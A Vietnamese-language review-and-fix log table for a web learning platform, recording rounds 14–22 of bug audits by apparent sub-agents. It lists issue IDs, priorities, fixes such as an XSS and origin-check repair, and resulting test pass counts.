| 2026-08-11 (round 14 fix — Lesson Study) | **Fix Lesson Study / Course Modules — 3 sub agent** (Backend 13 mục + test · Frontend 26 mục · Tests 10 mục). Nổi bật: **hết 404 CRUD — prefix /api/v1 + 2 endpoint Update/Delete item mới + import-course route** (LS-001/002/004), **reorder hoạt động 1 hệ HTML5 + keyboard** (LS-003/026), **ItemFormModal nạp danh sách thật** (LS-005), **override nối 3 tầng — command 8 field + query merge + validate thuộc lớp** (LS-009), GroupBy hết 500 /my-progress (LS-008), UnlockRuleEngine không đếm item ẩn (LS-010), sequential lock thật (LS-012), controller 403/404 thay 500 (LS-022), migration PrerequisiteItemId Guid. Test mới: classroomCurriculum.spec 14 + sidebar 8 + view 4 + moduleItemRow 12 + student query 9 + controller 10. Kết quả: backend **552/552 PASS** (+45), frontend **3129/3129 PASS** (170 files, +43), `vue-tsc` 0 lỗi. |
| 2026-08-11 (round 15 — Teacher Panel) | **Review sâu Teacher Panel (Phase 3.3) — 3 sub agent** (Logic+Backend / UI-UX / Test-Integration): ghi nhận **47 lỗi TC-001→047** (P0=5, P1=15, P2=24, P3=9). Nổi bật: **QuizBuilderTab CRUD endpoint không tồn tại (TC-001 P0)**, **CodelabBuilder CRUD chưa implement + modal stub (TC-002/003/004 P0)**, **AnalyticsTab URL thiếu v1 → 404 (TC-005 P0)**, token localStorage sai key 401 (TC-006), upload ảnh luôn 400 (TC-010), quiz không OwnerId (TC-021), delete quiz cascade xóa attempt history (TC-022), **import Excel đã bị gỡ nhưng docs/test vẫn "Done" (TC-024)**, completionRate 2 kiểu (TC-017), 0 test backend teacher + TeacherCourseTab/QuizBuilderTab 0 spec (TC-034/036/040). |
| 2026-08-11 (round 15 fix — Teacher Panel) | **Fix Teacher Panel — 3 sub agent** (Backend 11 mục + test · Frontend 25 mục · Tests 11 mục). Nổi bật: **QuizBuilderTab + CodelabBuilderTab hoạt động thật** — manage API CRUD questions + CodelabController full CRUD (TC-001/002/003/004), Analytics URL v1 hết 404 (TC-005), teacherRequest 401 refresh/timeout (TC-013), **Quiz CreatedByTeacherId ownership + soft-delete giữ attempt history** (TC-021/022), quiz liên kết lesson (TC-011), analytics schema đúng (TC-012), upload ảnh hết 400 (TC-010), KeepAlive tabs + useModalA11y chung (TC-027/028), import course transaction + ownership (TC-025). Test mới: TeacherControllerTests 9 + teacherCourseTab 8 + quizBuilderTab + useQuizBuilder 8 + useTeacherApi 12 + teacherModals + teacher 68→123. Kết quả: backend **591/591 PASS** (+39), frontend **3184/3184 PASS** (175 files, +55), `vue-tsc` 0 lỗi. Còn lại: TC-041 PARTIAL. |
| 2026-08-11 (round 16 — Classrooms) | **Review sâu Classrooms (Phase 3.4, cuối Phase 3) — 3 sub agent** (Logic+Backend / UI-UX / Test-Integration): ghi nhận **51 lỗi CR-001→051** (P0=2, P1=11, P2=18, P3=20). Nổi bật: **validator regex mâu thuẫn generator → join luôn 400 (CR-001 P0)**, **MyClassroomsView URL thiếu v1 → 404 list+join (CR-002 P0)**, lesson classroom render trống (CR-003), hasNext hardcode + "Đã hoàn thành module!" luôn hiện (CR-004), back dead + CustomLesson dead-end (CR-005/006), complete không refresh sidebar (CR-007), **không error state — kick vẫn thấy trang "lớp trống" (CR-008)**, kick rejoin được (CR-014), curriculum không filter Active (CR-015), **N+1 engine còn nguyên sau LM-026 (CR-018)**, analytics đọc course gốc sai (CR-019), score client tự khai (CR-020), **không có tính năng Rời lớp (CR-026)**, 0 spec MyClassrooms/Player/Grading/Analytics (CR-010→013). |
| 2026-08-11 (round 16 fix — Classrooms) | **Fix Classrooms — 3 sub agent** (Backend 21 mục + test · Frontend 23 mục · Tests 8 mục). Nổi bật: **join hoạt động — validator đồng bộ generator** (CR-001), **URL v1 hết 404 list+join** (CR-002), **player hết gãy — hasNext/back/CustomLesson/footer thật** (CR-004→006/023), DTO lesson đủ content (CR-003), complete refresh + error state (CR-007/008), **kick = ban rejoin + curriculum filter Active** (CR-014/015), **N+1 engine hết — 400→2 query** (CR-018), score server-side hết khai bậy (CR-020), **tính năng Rời lớp mới** (CR-026), {message} chuẩn hóa (CR-032), leave endpoint. Test mới: myClassroomsView 11 + classroomItemPlayer 13 + controller 35 + grading 9 + validator 9. Kết quả: backend **665/665 PASS** (+74), frontend **3221/3221 PASS** (177 files, +37), `vue-tsc` 0 lỗi. **PHASE 3 HOÀN TẤT (Courses + Lesson Study + Teacher + Classrooms) — 10/16.** |
| 2026-08-11 (round 17 — Gamification) | **Review sâu Gamification (Phase 4.1) — 3 sub agent** (Logic+Backend / UI-UX / Test-Integration): ghi nhận **46 lỗi GM-001→046** (P0=3, P1=9, P2=22, P3=12). Nổi bật: **XP farm /users/me/xp (GM-001 P0)**, **URL API sai 404 online-sync (GM-002 P0)**, **map sai DTO sync (GM-003 P0)**, award không idempotent + 2 transaction (GM-004), LeaderboardHub no auth + dead real-time (GM-006), **badge grant race (GM-007)**, **streak lệch timezone 2 hệ (GM-008)**, **badge 2 hệ id lệch — cabinet luôn khóa (GM-009)**, **leaderboard tuần mock hardcode (GM-010)**, strategy singleton profile dùng chung (GM-011), test confetti pass giả (GM-012), stale sau award (GM-021), nút +50 XP Demo cho mọi user 403 (GM-024), 0 contract spec 3 API (GM-031). |
| 2026-08-11 (round 17 fix — Gamification) | **Fix Gamification — 3 sub agent** (Backend 15 mục + test · Frontend 21 mục · Tests 14 mục). Nổi bật: **XP hết farm — Idempotency-Key + cap 500/ngày + rate limit cả 2 endpoint** (GM-001/005), **URL/DTO đúng — online-sync hoạt động** (GM-002/003), **badge 1 nguồn id backend 8 badge + danh sách đầy đủ** (GM-009), **streak server source of truth + lastActiveDate thật** (GM-008/014/029), **leaderboard real-time qua Broker + hub auth** (GM-006), **badge grant race hết (root cause EF Id)** (GM-007), **strategy state riêng theo user DB-first** (GM-011), confetti reduced-motion + freeze đúng 1 ngày (GM-018/022). Test mới: 3 API contract spec 17 + confetti overlay 4 + TZ matrix + freeze store + backend 43. Kết quả: backend **708/708 PASS** (+43), frontend **3269/3269 PASS** (181 files, +48), `vue-tsc` 0 lỗi. |
| 2026-08-11 (round 18 — User Profile) | **Review sâu User Profile (Phase 4.2) — 3 sub agent** (Logic+Backend / UI-UX / Test-Integration): ghi nhận **37 lỗi PR-001→037** (P1=9, P2=14, P3=14). Nổi bật: **UpdateProfile không persist DB — mất dữ liệu sau restart (PR-001 P1)**, **quiz bank không ghi QuizAttempt → history gần như rỗng (PR-002)**, modal thiếu a11y (PR-003), tabs thiếu ARIA (PR-004), **avatar upload thiếu dù PB-103 Must (PR-005)**, test pass giả PF-007 (PR-006), ProfileView 0 test (PR-007), **lastActiveDate contract drift 2 đầu (PR-009)**, fetchQuizHistory không caller + 3 bản history (PR-011), **Preferences tab dead (PR-012)**, trùng username chỉ in-memory (PR-015). |
| 2026-08-11 (round 18 fix — User Profile) | **Fix User Profile — 3 sub agent** (Backend 7 mục + test · Frontend 19 mục · Tests 10 mục). Nổi bật: **UpdateProfile persist DB** (PR-001), **bank quiz ghi QuizAttempt — history đầy đủ** (PR-002), **avatar upload hoạt động end-to-end** (PR-005), **lastActiveDate server source of truth 2 đầu** (PR-009), **Preferences nối thật dsa_preferences** (PR-012), trùng username check DB + validate (PR-015), modal/tabs a11y chuẩn (PR-003/004), history dùng fetchQuizHistory + error state (PR-011/014), level từ server config (PR-026). Migration 20260812155357. Test mới: profileViewP1 7 + security 6 + userProgressApi 8. Kết quả: backend **720/720 PASS** (+12), frontend **3298/3298 PASS** (184 files, +29), `vue-tsc` 0 lỗi. |
| 2026-08-11 (round 19 — Embed Widget) | **Review sâu Embed Widget (Phase 4.3) — 3 sub agent** (Logic Engine / UI-UX / Test-Integration): ghi nhận **33 lỗi EW-001→033** (P0=3, P1=7, P2=13, P3=10). Nổi bật: **sendMessage targetOrigin sai → auto-height cross-origin chết (EW-001 P0)**, **engine bridge/resizer dead code không wire (EW-002 P0)**, **query params theme/vcr/watch/algo không được tiêu thụ (EW-003 P0)**, LivePreview mock tĩnh không iframe (EW-004), algo query không guard crash (EW-005), **bridge([]) fail-open nhận mọi origin (EW-006)**, test pass giả default allowlist (EW-007), resizer pipeline chưa test + stale guard sai (EW-008), copy không assert payload (EW-009), **0 component test (EW-010)**, hint lỗi 5 algo không tồn tại (EW-011). |
| 2026-08-11 (round 19 fix — Embed Widget) | **Fix Embed Widget — 3 sub agent** (Engine+Store 10 mục · Components+View 14 mục · Tests 12 mục). Nổi bật: **engine wire thật — WIDGET_READY/STEP/RESET/HEIGHT_CHANGED hoạt động** (EW-002), **targetOrigin hướng host** (EW-001), **query params theme/vcr/watch/interactive/algo được widget tiêu thụ** (EW-003), **preview iframe thật** (EW-004), **bridge fail-closed + shape validate** (EW-006/012), **1 nguồn allowlist + wildcard khớp cả base** (EW-013), loading/error + VCR thật (EW-015), premium dijkstra cảnh báo (EW-016), host script data-embed-widget (EW-017), responsive (EW-018). Test mới: embedComponents 24 + embedWidgetView 11 + resizer pipeline 8 + origin edge 7. Kết quả: frontend **3363/3363 PASS** (186 files, +65), `vue-tsc` 0 lỗi, backend 720/720. |
| 2026-08-11 (round 20 — Export & Share) | **Review sâu Export & Share (Phase 4.4) — 3 sub agent** (Logic Engine / UI-UX / Test-Integration): ghi nhận **30 lỗi EX-001→030** (P1=7, P2=14, P3=9). Nổi bật: **QR không bao giờ vẽ (flush pre)** (EX-001 P1), **share link trỏ /s/ route không tồn tại — link 404 + QR quét chết** (EX-002), **MAX 20K vượt dung lượng QR + toCanvas không try/catch** (EX-003), export/link fail im lặng (EX-004), **PNG export pass giả — img.onload không fire promise treo isExporting kẹt** (EX-005), modal thiếu a11y (EX-006), **0 component test + 0 roundtrip test** (EX-007), cssRules app nhét vào SVG (EX-008), font không nhúng lệch fidelity (EX-009), pipeline data demo tĩnh (EX-010), **URLSearchParams decode +→space phá payload** (EX-013), revokeObjectURL đồng bộ hủy download (EX-014). |
| 2026-08-11 (round 20 fix — Export & Share) | **Fix Export & Share — 3 sub agent** (Engine+Store 11 mục · Components+View+Router 9 mục · Tests 14 mục). Nổi bật: **QR vẽ đúng (flush post + onMounted)** (EX-001), **route /s + ShareRestoreView — roundtrip export→restore thật** (EX-002), **limit 2500 khớp QR + try/catch** (EX-003), **PNG settle thật + progress thật [30,50,75,90]** (EX-005/025), **payload encodeURIComponent hết +→space** (EX-013), **revoke defer trong setTimeout** (EX-014), cssRules lọc theo scope workspace (EX-008), font fallback khớp (EX-009), workspace wire thật + snapshot click (EX-010), exportError/linkError feedback (EX-004), modal a11y chuẩn (EX-006). Test mới: shareExportModal 8 + qrCodeDisplay 4 + shareRestoreView 10 + roundtrip unicode; tách 51 test SignalR/Payment sang spec đúng feature. Kết quả: frontend **3398/3398 PASS** (192 files, +35), `vue-tsc` 0 lỗi, backend 720/720. EX-023 PARTIAL. |
| 2026-08-11 (round 21 — Notifications) | **Review sâu Notifications (Phase 4.5) — 3 sub agent** (Logic+Backend / UI-UX / Test-Integration): ghi nhận **29 lỗi NT-001→029** (P0=1, P1=6, P2=14, P3=8). Nổi bật: **URL contract mismatch concepts/notifications → 404 — tính năng chết hoàn toàn (NT-001 P0)**, **realtime dead 2 đầu — hub không invoke + Service không DI + connectNotifications chỉ test (NT-002)**, **hub method public spoof (NT-003)**, store không reset đổi user (NT-004), bell item không keyboard (NT-005), bell test pass giả timing (NT-006), **backend 0 test (NT-007)**, 401 nuốt im lặng (NT-008), không polling/realtime (NT-009), MarkAllAsRead kém hiệu quả (NT-010), unreadCount sai >100 (NT-011). |
| 2026-08-11 (round 21 fix — Notifications) | **Fix Notifications — 3 sub agent** (Backend 10 mục + test · Frontend 15 mục · Tests 9 mục). Nổi bật: **URL đúng /api/v1/notifications hết 404** (NT-001), **realtime thật — INotificationService DI + NotificationBroadcastBroker + hub push Clients.User + FE connect sau login + polling 60s backup** (NT-002/009), **hub hết spoof — xóa method client-invokable** (NT-003), **store reset đổi user** (NT-004), **401 auto-refresh retry** (NT-008), **unread-count endpoint + totalUnread trong list** (NT-011), MarkAllAsRead ExecuteUpdate atomic (NT-010), NotifyAdmins batch + role const (NT-016), bell a11y đầy đủ (NT-005/013/014), formatTime validate (NT-024). Test mới: controller 14 + service 14 + hub 6 + FE 25. Kết quả: backend **754/754 PASS** (+34), frontend **3423/3423 PASS** (192 files, +25), `vue-tsc` 0 lỗi. TODO: nối NotifyBadgeAwarded/LevelUp tại GamificationService. |
| 2026-08-11 (round 22 — Core & UI) | **Review sâu Core & UI Components (Phase 4.6, ROUND CUỐI CÙNG) — 3 sub agent** (Logic+Shared / UI-UX / Test-Integration): ghi nhận **38 lỗi CU-001→038** (P0=1, P1=9, P2=18, P3=10). Nổi bật: **CustomMarkdownEditor XSS javascript: href + v-html không escape (CU-001 P0)**, ConfirmModal vi phạm TC-028 (CU-002), **useModalA11y watch không immediate + stack chồng modal** (CU-003), AppHeader nav mobile mất (CU-004), nav dropdown không keyboard (CU-005), accordion không keyboard (CU-006), **filteredTabs copy-paste test không mount (CU-007)**, **useModalA11y/markdown/useThemeStore 0 spec (CU-008→010)**, shared apiClient duplicate + không timeout (CU-011/012), toast timer leak + clearAll (CU-013), theme FOUC (CU-014), markdown renderer trùng + Image toolbar hỏng (CU-015), confetti timer chéo component (CU-016). |
| 2026-08-11 (round 22 fix — Core & UI) | **Fix Core & UI — 3 sub agent (ROUND CUỐI CÙNG)** (Shared 11 mục · Components 16 mục · Tests 13 mục). Nổi bật: **XSS markdown hết — escape-first + whitelist scheme** (CU-001), **ConfirmModal/AppHeader/accordion/dropdown a11y chuẩn TC-028** (CU-002/004→006), **useModalA11y immediate + stack modal đúng** (CU-003), **theme hết FOUC — init sync + try/catch** (CU-014), **toast/confetti hết timer leak** (CU-013/016), **1 nguồn apiClient + timeout + content-type guard** (CU-011/012), hamburger mobile (CU-004), SortableContextWrapper xóa (CU-017), skeleton reduced-motion (CU-020). Test mới: useModalA11y 7 + markdown 10 + theme 11 + appHeader 10 + toast 12 + skeleton 7 + apiClient 9. Kết quả: frontend **3474/3474 PASS** (197 files, +51), `vue-tsc` 0 lỗi, backend 754/754. **HOÀN TẤT TOÀN BỘ 16/16 TÍNH NĂNG DoD — KẾT THÚC CHIẾN DỊCH REVIEW.** |

> **Quy tắc sử dụng:** Thêm lỗi mới vào cuối phần feature tương ứng (ID tăng dần). Sau khi sửa xong: đổi Status `OPEN` → `FIXED`, ghi commit/bằng chứng. Không xóa lỗi đã ghi.
